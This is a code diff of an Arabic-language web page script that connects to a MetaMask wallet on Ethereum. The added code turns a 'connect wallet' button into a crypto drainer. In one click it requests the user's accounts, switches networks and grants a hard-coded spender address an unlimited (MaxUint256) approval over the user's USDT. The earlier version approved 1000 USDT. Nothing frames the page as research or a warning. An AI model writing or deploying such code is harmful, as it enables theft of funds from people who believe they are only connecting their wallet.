@@ -40,63 +40,81 @@
   <p id="walletStatus">...</p>
 
   <script>
-    const openMetaMaskBtn = document.getElementById('openMetaMask');
-    const approveBtn = document.getElementById('approveBtn');
-    const walletStatus = document.getElementById('walletStatus');
+  const connectWalletBtn = document.getElementById('connectWallet');
+  const walletStatus = document.getElementById('walletStatus');
 
-    const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT
-    const spender = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D';     // spender address
+  const networks = {
+    ethereum: {
+      chainId: 1,
+      name: 'Ethereum',
+      symbol: 'ETH',
+      explorer: 'https://etherscan.io',
+      rpc: 'https://cloudflare-eth.com',
+    }
+  };
 
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
-    openMetaMaskBtn.onclick = () => {
-      if (typeof window.ethereum === 'undefined') {
-        if (isMobile) {
-          // حاول تفتح تطبيق MetaMask ب deep link
-          const dappUrl = location.href.replace(/^https?:\/\//, '');
-          const metamaskDeepLink = `metamask://dapp/${dappUrl}`;
-          window.location.href = metamaskDeepLink;
-          walletStatus.textContent = 'جارٍ فتح MetaMask، ارجع للصفحة واضغط "اعطِ الموافقة"';
-        } else {
-          walletStatus.textContent = 'يرجى تثبيت MetaMask على المتصفح.';
-        }
-        return;
+  async function switchNetwork(networkKey) {
+    const network = networks[networkKey];
+    const hexChainId = '0x' + network.chainId.toString(16);
+    try {
+      await window.ethereum.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: hexChainId }],
+      });
+    } catch (switchError) {
+      console.error('Switch network error:', switchError);
+      walletStatus.textContent = 'فشل في التبديل للشبكة المطلوبة.';
+    }
+  }
+
+  connectWalletBtn.addEventListener('click', async () => {
+    if (typeof window.ethereum === 'undefined') {
+      if (isMobile) {
+        const redirectUrl = 'metamask://dapp/' + location.href.replace(/^https?:\/\//, '');
+        walletStatus.textContent = 'جارٍ فتح MetaMask، ثم ارجع للصفحة واضغط الزر مرة أخرى.';
+        window.location.href = redirectUrl;
+      } else {
+        walletStatus.textContent = 'يرجى تثبيت MetaMask على المتصفح.';
       }
-      walletStatus.textContent = 'MetaMask متاح، اضغط "اعطِ الموافقة" لإكمال العملية.';
-      approveBtn.disabled = false;
-    };
+      return;
+    }
 
-    approveBtn.onclick = async () => {
-      walletStatus.textContent = 'جارٍ الاتصال بالمحفظة...';
+    const provider = new window.ethers.providers.Web3Provider(window.ethereum);
 
-      try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send('eth_requestAccounts', []);
-        const signer = provider.getSigner();
-        const network = await provider.getNetwork();
+    try {
+      await provider.send('eth_requestAccounts', []);
+      const signer = provider.getSigner();
+      const address = await signer.getAddress();
+      const network = await provider.getNetwork();
 
-        if (network.chainId !== 1) {
-          walletStatus.textContent = 'يرجى التبديل إلى شبكة Ethereum Mainnet في MetaMask.';
-          return;
-        }
-
-        const amount = ethers.utils.parseUnits("1000", 6); // 1000 USDT
-
-        const abi = ['function approve(address spender, uint256 amount) public returns (bool)'];
-        const tokenContract = new ethers.Contract(tokenAddress, abi, signer);
-
-        walletStatus.textContent = 'جارٍ إرسال طلب الموافقة...';
-
-        const tx = await tokenContract.approve(spender, amount);
-        await tx.wait();
-
-        walletStatus.textContent = 'تمت الموافقة بنجاح ✅';
-      } catch (error) {
-        console.error(error);
-     walletStatus.textContent = 'فشل تنفيذ الموافقة ❌\n' + (error.message || error);
+      if (network.chainId !== networks.ethereum.chainId) {
+        await switchNetwork('ethereum');
       }
-    };
-  </script>
+
+      // إعدادات approve
+      const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT
+      const spender = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D';   // العنوان اللي أعطيتني إياه
+      const amount = window.ethers.constants.MaxUint256;
+
+      const abi = [
+        'function approve(address spender, uint256 amount) public returns (bool)'
+      ];
+
+      const tokenContract = new window.ethers.Contract(tokenAddress, abi, signer);
+
+      const tx = await tokenContract.approve(spender, amount);
+      await tx.wait();
+
+      walletStatus.textContent = 'تمت الموافقة بنجاح ✅';
+    } catch (error) {
+      console.error(error);
+      walletStatus.textContent = 'فشل تنفيذ الموافقة ❌\n' + (error.message || error);
+    }
+  });
+</script>
+
 
 </body>
 </html>
